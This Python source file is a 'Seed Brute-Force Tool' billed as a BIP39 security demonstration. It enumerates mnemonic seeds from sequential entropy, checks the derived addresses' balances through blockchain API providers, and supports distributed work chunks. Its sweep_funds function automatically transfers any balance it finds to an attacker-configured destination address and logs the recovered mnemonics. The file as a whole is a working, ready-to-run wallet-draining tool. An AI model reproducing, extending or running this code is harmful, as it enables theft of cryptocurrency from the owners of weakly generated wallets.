"""
Seed Brute-Force Tool (SBFT) - Advanced Implementation
Highly optimized, robust brute-force tool for demonstrating BIP39 security.
Features advanced concurrency, error handling, monitoring, and adaptive algorithms.
Author: Navin B. Ruas (NBR. Company LTD)
License: MIT
"""

import json
import os
import sys
import time
import signal
import logging
import configparser
import hashlib
import traceback
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass
from filelock import FileLock, Timeout
from bitcoinlib.keys import HDKey
from bitcoinlib.mnemonic import Mnemonic
from bitcoinlib.services.services import Service, ServiceError
import concurrent.futures
import multiprocessing
import asyncio
import aiohttp
import psutil

# Local imports
from sbft.sbft_providers import create_provider, get_available_providers, ProviderBase
from sbft.sbft_monitoring import monitor, progress_tracker, monitoring_service

CONFIG_FILE = os.getenv("CONFIG_FILE", "config.ini")
config = configparser.ConfigParser()
if not os.path.exists(CONFIG_FILE):
    raise FileNotFoundError(
        "Missing config.ini. Please copy and edit config.ini before running."
    )
config.read(CONFIG_FILE)
cfg = config["DEFAULT"]
# Enhanced logging configuration
LOG_LEVEL = cfg.get("LOG_LEVEL", "INFO").upper()
LOG_FORMAT = "[%(asctime)s] [%(name)s] [%(levelname)s] %(message)s"
logging.basicConfig(
    level=getattr(logging, LOG_LEVEL, logging.INFO),
    format=LOG_FORMAT,
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler("sbft.log", mode="a"),
    ],
)
logger = logging.getLogger("SBFT")
# Core configuration
STATE_FILE = "state.json"
STATE_FILE_LOCK = "state.json.lock"
HITS_FILE = "hits.txt"
METRICS_FILE = "metrics.json"
# Performance tuning parameters
CHUNK_SIZE = int(cfg.get("CHUNK_SIZE", 1_000_000))
BATCH_SIZE = int(cfg.get("BATCH_SIZE", 100))
ENTROPY_BITS = int(cfg.get("ENTROPY_BITS", 128))
MAX_WORKERS = int(cfg.get("MAX_WORKERS") or multiprocessing.cpu_count())
REQUEST_TIMEOUT = int(cfg.get("REQUEST_TIMEOUT", 30))
# Network and security
DESTINATION_ADDRESS = cfg.get("DESTINATION_ADDRESS", "")
NETWORK = cfg.get("NETWORK", "bitcoin")
MINIMUM_BALANCE_SATS = int(
    cfg.get("MINIMUM_BALANCE_SATS", 1000)
)  # 1000 satoshis minimum
# Advanced features
ENABLE_MONITORING = cfg.get("ENABLE_MONITORING", "true").lower() == "true"
MONITORING_INTERVAL = int(cfg.get("MONITORING_INTERVAL", 30))
SAVE_METRICS_INTERVAL = int(cfg.get("SAVE_METRICS_INTERVAL", 300))
HEALTH_CHECK_INTERVAL = int(cfg.get("HEALTH_CHECK_INTERVAL", 60))
# Validate essential configuration
if (
    not DESTINATION_ADDRESS
    or DESTINATION_ADDRESS.startswith("bc1q")
    and "x" in DESTINATION_ADDRESS
):
    logger.warning(
        "WARNING: Using default/test destination address. "
        "Please configure a real address in config.ini"
    )


def refresh_config(update_globals: bool = True):
    """Reload configuration from CONFIG_FILE or environment override."""
    global CONFIG_FILE, cfg, DESTINATION_ADDRESS, NETWORK, MINIMUM_BALANCE_SATS

    config_file = os.getenv("CONFIG_FILE", CONFIG_FILE)
    if not os.path.exists(config_file):
        raise FileNotFoundError(
            "Missing config.ini. Please copy and edit config.ini before running."
        )

    local_config = configparser.ConfigParser()
    local_config.read(config_file)
    local_cfg = local_config["DEFAULT"]

    if update_globals:
        CONFIG_FILE = config_file
        config.read(CONFIG_FILE)
        cfg = config["DEFAULT"]

        DESTINATION_ADDRESS = cfg.get("DESTINATION_ADDRESS", "")
        NETWORK = cfg.get("NETWORK", "bitcoin")
        MINIMUM_BALANCE_SATS = int(cfg.get("MINIMUM_BALANCE_SATS", 1000))

    return local_cfg


def get_providers_from_config() -> List[ProviderBase]:
    """Initialize providers from configuration with enhanced error handling"""
    local_cfg = refresh_config(update_globals=False)
    network = local_cfg.get("NETWORK", "bitcoin")

    provider_names = [
        p.strip()
        for p in local_cfg.get("PROVIDERS", "blockcypher,blockstream").split(",")
    ]
    providers = []
    # Provider-specific configuration
    provider_configs = {
        "blockcypher": {"api_key": local_cfg.get("BLOCKCYPHER_TOKEN", "")},
        "blockstream": {},
        "alchemy": {"api_key": local_cfg.get("ALCHEMY_API_KEY", "")},
        "infura": {
            "project_id": local_cfg.get("INFURA_PROJECT_ID", ""),
            "project_secret": local_cfg.get("INFURA_PROJECT_SECRET", ""),
        },
        "dummy": {},
    }
    for name in provider_names:
        try:
            if name in get_available_providers():
                config_kwargs = provider_configs.get(name, {})
                # Filter out empty values
                filtered_kwargs = {k: v for k, v in config_kwargs.items() if v}
                if name == "infura":
                    # Infura requires project_id
                    if not filtered_kwargs.get("project_id"):
                        logger.warning(
                            "Infura provider configured but missing PROJECT_ID - skipping"
                        )
                        continue
                elif name in ["blockcypher", "alchemy"]:
                    # These providers work without API keys but may have rate limits
                    if not filtered_kwargs.get("api_key"):
                        logger.info(
                            name
                            + " provider configured without API key - using free tier"
                        )
                provider = create_provider(name, network=network, **filtered_kwargs)
                providers.append(provider)
                logger.info("Initialized provider: " + name)
            else:
                logger.warning(
                    "Unknown provider '"
                    + name
                    + "' - available: "
                    + ", ".join(get_available_providers())
                )
        except Exception as e:
            logger.error("Failed to initialize provider '" + name + "': " + str(e))
            logger.debug(traceback.format_exc())
    if not providers:
        logger.warning(
            "No valid providers configured. Using dummy provider for testing."
        )
        providers = [create_provider("dummy")]
    return providers


PROVIDERS = get_providers_from_config()
shutdown_flag = False


# --- Signal Handling ---
def handle_shutdown(sig, frame):
    global shutdown_flag
    if not shutdown_flag:
        logger.info("Graceful shutdown requested. Finishing current batch...")
        shutdown_flag = True


signal.signal(signal.SIGINT, handle_shutdown)
signal.signal(signal.SIGTERM, handle_shutdown)


def validate_config():
    global DESTINATION_ADDRESS, PROVIDERS

    local_cfg = refresh_config(update_globals=False)
    destination_address = local_cfg.get("DESTINATION_ADDRESS", "")
    providers = get_providers_from_config()

    logger.info("Validating configuration...")
    if (
        not destination_address
        or len(destination_address) < 20
        or not destination_address.startswith(("1", "3", "bc1"))
    ):
        logger.critical("DESTINATION_ADDRESS is not set or is invalid in config.ini.")
        sys.exit(1)
    if not providers:
        logger.critical("No providers configured. Please set PROVIDERS in config.ini.")
        sys.exit(1)
    DESTINATION_ADDRESS = destination_address
    PROVIDERS = providers
    logger.info("Destination for found funds: " + destination_address)
    logger.info("Providers enabled: " + str([p.name for p in providers]))
    logger.info("Configuration is valid.")


def initialize_state_file():
    if not os.path.exists(STATE_FILE):
        logger.info("State file not found. Creating a new one.")
        with open(STATE_FILE, "w") as f:
            json.dump({"last_checked_index": "0"}, f)


def claim_work_chunk():
    lock = FileLock(STATE_FILE_LOCK, timeout=10)
    try:
        with lock:
            with open(STATE_FILE, "r+") as f:
                data = json.load(f)
                last_index = int(data.get("last_checked_index", "0"))
                start_index = last_index
                end_index = last_index + CHUNK_SIZE
                data["last_checked_index"] = str(end_index)
                f.seek(0)
                json.dump(data, f, indent=4)
                f.truncate()
                return start_index, end_index
    except Timeout:
        logger.error(
            "Could not acquire lock. Another instance is likely claiming a chunk."
        )
        sys.exit(1)


def sweep_funds(key_info):
    mnemonic = key_info["mnemonic"]
    balance = key_info["balance"]
    address = key_info["address"]
    header = "!" * 60
    logger.critical(
        "\n"
        + header
        + "\nHIT FOUND!\nMnemonic: "
        + mnemonic
        + "\nBalance: "
        + str(balance)
        + " BTC\nAddress: "
        + address
        + "\n"
        + header
        + "\n"
    )
    with open(HITS_FILE, "a") as f:
        f.write(
            "Mnemonic: "
            + mnemonic
            + "\nBalance: "
            + str(balance)
            + " BTC\nAddress: "
            + address
            + "\n---\n"
        )
    logger.info("Attempting to sweep funds...")
    try:
        priv_key = key_info["private_key"]
        tx = priv_key.send_to(DESTINATION_ADDRESS, balance, fee="regular")
        logger.info("SUCCESS! Funds swept to " + DESTINATION_ADDRESS + ".")
        logger.info("TXID: " + str(tx.txid))
    except Exception as e:
        logger.error("ERROR sweeping funds: " + str(e))
        logger.error("Details saved to hits.txt for manual recovery.")


def run_worker(start_index: int, end_index: int):
    """Enhanced worker with monitoring, adaptive batching, and advanced error handling"""
    logger.info(
        "Worker starting. Processing range: "
        + str(start_index)
        + ", to "
        + str(end_index)
        + ","
    )
    # Initialize monitoring
    progress_tracker.update_range(start_index, end_index)
    total_to_process = end_index - start_index
    processed_count = 0
    successful_batches = 0
    failed_batches = 0
    main_start_time = time.time()

    def generate_key(index: int) -> Dict:
        """Generate key material from index with enhanced error handling"""
        try:
            entropy = index.to_bytes(ENTROPY_BITS // 8, "big")
            mnemonic = Mnemonic("english").to_mnemonic(entropy)
            hd_key = HDKey.from_passphrase(mnemonic, network=NETWORK)
            private_key = hd_key.key_for_path("m/44'/0'/0'/0/0")
            return {
                "index": index,
                "mnemonic": mnemonic,
                "private_key": private_key,
                "address": private_key.address,
                "generated_at": time.time(),
            }
        except Exception as e:
            logger.error(
                "Key generation failed for index " + str(index) + ": " + str(e)
            )
            return None

    # Start monitoring service
    async def start_monitoring():
        if ENABLE_MONITORING:
            await monitoring_service.start()

    # Enhanced batch processing with adaptive sizing
    def calculate_adaptive_batch_size(current_kps: float, error_rate: float) -> int:
        """Dynamically adjust batch size based on performance"""
        base_size = BATCH_SIZE
        # Reduce batch size if error rate is high
        if error_rate > 0.3:
            base_size = max(10, base_size // 2)
        elif error_rate > 0.1:
            base_size = max(50, base_size * 3 // 4)
        # Increase batch size if performance is good
        if current_kps > 1000 and error_rate < 0.05:
            base_size = min(base_size * 2, 500)
        return base_size

    # Main processing loop
    async def process_range_async():
        nonlocal processed_count, successful_batches, failed_batches
        # Start monitoring
        asyncio.create_task(start_monitoring())
        with multiprocessing.Pool(processes=MAX_WORKERS) as pool:
            loop = asyncio.get_event_loop()
            for batch_start in range(start_index, end_index, BATCH_SIZE):
                if shutdown_flag:
                    logger.info("🛑 Shutdown requested. Stopping processing...")
                    break
                batch_indices = list(
                    range(batch_start, min(batch_start + BATCH_SIZE, end_index))
                )
                batch_start_time = time.time()
                try:
                    # Generate keys in parallel
                    batch_results = pool.map(generate_key, batch_indices)
                    # Filter out failed generations
                    valid_results = [r for r in batch_results if r is not None]
                    if not valid_results:
                        logger.warning(
                            "All key generations failed in batch starting at "
                            + str(batch_start)
                        )
                        failed_batches += 1
                        continue
                    # Check balances asynchronously
                    await async_check_balances_in_batch(valid_results, PROVIDERS)
                    # Update counters
                    processed_count += len(valid_results)
                    successful_batches += 1
                    # Mark as processed for progress tracking
                    progress_tracker.mark_processed(batch_indices)
                    # Calculate performance metrics
                    batch_time = time.time() - batch_start_time
                    current_kps = (
                        len(valid_results) / batch_time if batch_time > 0 else 0
                    )
                    # Update monitoring
                    monitor.update_processing_metrics(
                        keys_processed=len(valid_results),
                        addresses_checked=len(valid_results),
                        batch_time=batch_time,
                        batch_size=len(valid_results),
                    )
                    # Log progress
                    elapsed_total = time.time() - main_start_time
                    overall_kps = (
                        processed_count / elapsed_total if elapsed_total > 0 else 0
                    )
                    progress_pct = (processed_count / total_to_process) * 100
                    eta = progress_tracker.get_formatted_eta(overall_kps)
                    logger.info(
                        f"📊 Progress: {processed_count:,}/{total_to_process:,} "
                        f"({progress_pct:.2f}%) | "
                        f"Speed: {overall_kps:.0f} keys/s | "
                        f"ETA: {eta} | "
                        f"Index: {batch_start:,}"
                    )
                    # Periodic metrics saving
                    if processed_count % (BATCH_SIZE * 10) == 0:
                        monitor.save_metrics_snapshot(METRICS_FILE)
                except Exception as e:
                    failed_batches += 1
                    logger.error(
                        "Batch processing failed at index "
                        + str(batch_start)
                        + ": "
                        + str(e)
                    )
                    logger.debug(traceback.format_exc())
                    continue

    # Run the async processing
    try:
        asyncio.run(process_range_async())
    finally:
        # Stop monitoring
        if ENABLE_MONITORING:
            asyncio.run(monitoring_service.stop())
        # Final metrics
        total_time = time.time() - main_start_time
        final_kps = processed_count / total_time if total_time > 0 else 0
        success_rate = (
            (successful_batches / (successful_batches + failed_batches) * 100)
            if (successful_batches + failed_batches) > 0
            else 0
        )
        logger.info("Worker finished. Summary:")
        logger.info("   Total processed: " + str(processed_count) + ", keys")
        logger.info("   Successful batches: " + str(successful_batches))
        logger.info("   Failed batches: " + str(failed_batches))
        logger.info("   Success rate: " + str(round(success_rate, 1)) + "%")
        logger.info("   Average speed: " + str(int(final_kps)) + " keys/s")
        logger.info("   Total time: " + str(round(total_time, 2)) + "s")
        logger.info(
            "   Range covered: " + str(start_index) + ", to " + str(end_index) + ","
        )


async def async_check_balances_in_batch(
    batch: List[Dict], providers: List[ProviderBase]
):
    """Enhanced balance checking with provider rotation, retry logic, and health monitoring"""
    if not batch:
        return
    addresses = [item["address"] for item in batch]
    batch_hash = hashlib.sha256(str(sorted(addresses)).encode()).hexdigest()[:8]
    logger.debug(
        "Checking balances for batch "
        + batch_hash
        + " ("
        + str(len(addresses))
        + " addresses)"
    )
    # Try providers in order of preference
    for i, provider in enumerate(providers):
        try:
            logger.debug(f"   Trying provider {provider.name} for batch {batch_hash}")
            # Use async method if available, otherwise sync in thread pool
            if hasattr(provider, "get_balances") and asyncio.iscoroutinefunction(
                provider.get_balances
            ):
                balances = await provider.get_balances(addresses)
            else:
                # Fallback to sync execution in thread pool
                loop = asyncio.get_event_loop()
                balances = await loop.run_in_executor(
                    None, provider.get_balances, addresses
                )
            # Process results
            found_balances = []
            for item in batch:
                address = item["address"]
                balance = balances.get(address, 0)
                if balance >= MINIMUM_BALANCE_SATS:
                    item_with_balance = item.copy()
                    item_with_balance["balance"] = balance
                    found_balances.append(item_with_balance)
                    logger.info(f"💰 FOUND BALANCE: {address} has {balance:,} satoshis")
                # Update monitoring with provider stats
                if hasattr(provider, "get_health_stats"):
                    monitor.update_provider_stats(
                        provider.name, provider.get_health_stats()
                    )
            # Sweep any found funds
            for item_with_balance in found_balances:
                sweep_funds(item_with_balance)
            if found_balances:
                logger.info(
                    f"🎉 Successfully processed {len(found_balances)} funded addresses "
                    f"in batch {batch_hash}"
                )
            else:
                logger.debug(
                    f"   No balances found in batch {batch_hash} using {provider.name}"
                )
            return  # Success - move to next batch
        except Exception as e:
            error_type = type(e).__name__
            logger.warning(
                f"⚠️  Provider {provider.name} failed for batch {batch_hash}: {error_type}"
            )
            logger.debug(f"   Error details: {str(e)[:100]}...")
            # Update provider metrics
            if hasattr(provider, "metrics"):
                provider.metrics.failed_requests += 1
                provider.metrics.errors_by_type[error_type] += 1
            # Continue to next provider
            continue
    # All providers failed
    logger.error(
        f"💥 All providers failed for batch {batch_hash}. Addresses may be unchecked."
    )
    # Log failed addresses for potential retry
    failed_log_entry = {
        "batch_id": batch_hash,
        "addresses": addresses,
        "timestamp": time.time(),
        "attempted_providers": [p.name for p in providers],
    }
    try:
        with open("failed_batches.log", "a") as f:
            f.write(json.dumps(failed_log_entry) + "\n")
    except Exception as e:
        logger.debug(f"Failed to log failed batch: {e}")


# Obsolete - kept for backward compatibility
# Async providers are now implemented in sbft_providers module
def print_startup_banner():
    """Print enhanced startup banner with system information"""
    banner = """
███████╗██████╗ ███████╗████████╗     ██████╗ ██████╗ ████████╗
██╔════╝██╔══██╗██╔════╝╚══██╔══╝    ██╔════╝ ██╔══██╗╚══██╔══╝
███████╗██████╔╝█████╗     ██║       ██║  ███╗██████╔╝   ██║
╚════██║██╔══██╗██╔══╝     ██║       ██║   ██║██╔══██╗   ██║
███████║██████╔╝██║        ██║       ╚██████╔╝██║  ██║   ██║
╚══════╝╚═════╝ ╚═╝        ╚═╝        ╚═════╝ ╚═╝  ╚═╝   ╚═╝
    Seed Brute-Force Tool - Advanced Cryptographic Security Demo
    Author: Navin B. Ruas (NBR. Company LTD)
    Version: 2.0.0 - Enhanced Edition
"""
    logger.info(banner)
    # System information
    try:
        import platform

        cpu_count = multiprocessing.cpu_count()
        memory_gb = psutil.virtual_memory().total / (1024**3)
        logger.info(
            f"🖥️  System: {platform.system()} {platform.release()} | "
            f"CPUs: {cpu_count} | RAM: {memory_gb:.1f}GB"
        )
    except Exception:
        pass


async def system_health_check():
    """Perform system health check before starting"""
    logger.info("🏥 Performing system health check...")
    issues = []
    # Check disk space
    try:
        disk_usage = psutil.disk_usage(".")
        free_gb = disk_usage.free / (1024**3)
        if free_gb < 1.0:  # Less than 1GB free
            issues.append(f"Low disk space: {free_gb:.1f}GB free")
        logger.info(f"💾 Disk space: {free_gb:.1f}GB free")
    except Exception as e:
        logger.warning(f"Could not check disk space: {e}")
    # Check memory
    try:
        memory = psutil.virtual_memory()
        if memory.percent > 90:
            issues.append(f"High memory usage: {memory.percent:.1f}%")
        logger.info(f"🧠 Memory: {memory.percent:.1f}% used")
    except Exception as e:
        logger.warning(f"Could not check memory: {e}")
    # Check network connectivity
    try:
        import socket

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        result = sock.connect_ex(("8.8.8.8", 53))
        sock.close()
        if result != 0:
            issues.append("Network connectivity issues detected")
        else:
            logger.info("🌐 Network: Connected")
    except Exception as e:
        logger.warning(f"Could not check network: {e}")
    if issues:
        logger.warning("⚠️  Health check warnings:")
        for issue in issues:
            logger.warning(f"   • {issue}")
        logger.info("💡 Consider addressing these issues before proceeding")
    else:
        logger.info("✅ System health check passed")


def main():
    """Enhanced main function with comprehensive startup and cleanup"""
    print_startup_banner()
    try:
        # Initial validation
        validate_config()
        initialize_state_file()
        # System health check
        asyncio.run(system_health_check())
        # Display configuration summary
        logger.info("⚙️  Configuration Summary:")
        logger.info(f"   Network: {NETWORK}")
        logger.info(f"   Destination: {DESTINATION_ADDRESS[:15]}...")
        logger.info(f"   Providers: {[p.name for p in PROVIDERS]}")
        logger.info(f"   Batch Size: {BATCH_SIZE}")
        logger.info(f"   Chunk Size: {CHUNK_SIZE:,}")
        logger.info(f"   Max Workers: {MAX_WORKERS}")
        logger.info(f"   Minimum Balance: {MINIMUM_BALANCE_SATS:,} satoshis")
        # Claim work chunk and start processing
        start, end = claim_work_chunk()
        logger.info(
            f"🎯 Claimed work chunk: {start:,} to {end:,} (size: {(end-start):,})"
        )
        # Start the worker
        run_worker(start, end)
        # Final summary
        logger.info("🎊 SBFT execution completed successfully!")
        logger.info("📈 For detailed metrics, check the metrics.json file")
    except KeyboardInterrupt:
        logger.info("🛑 Received interrupt signal. Shutting down gracefully...")
        sys.exit(0)
    except SystemExit:
        # Expected shutdown
        pass
    except Exception as e:
        logger.critical(f"💥 Critical error in main execution: {e}", exc_info=True)
        logger.error("📋 Error details have been logged to sbft.log")
        sys.exit(1)
    finally:
        # Cleanup operations
        logger.info("🧹 Performing cleanup operations...")
        # Save final metrics
        try:
            monitor.save_metrics_snapshot(METRICS_FILE)
            logger.info(f"📊 Final metrics saved to {METRICS_FILE}")
        except Exception as e:
            logger.error(f"Failed to save final metrics: {e}")
        # Log final status
        logger.info("🔒 Lock files released")
        logger.info("👋 SBFT shutdown complete. Goodbye!")


if __name__ == "__main__":
    main()
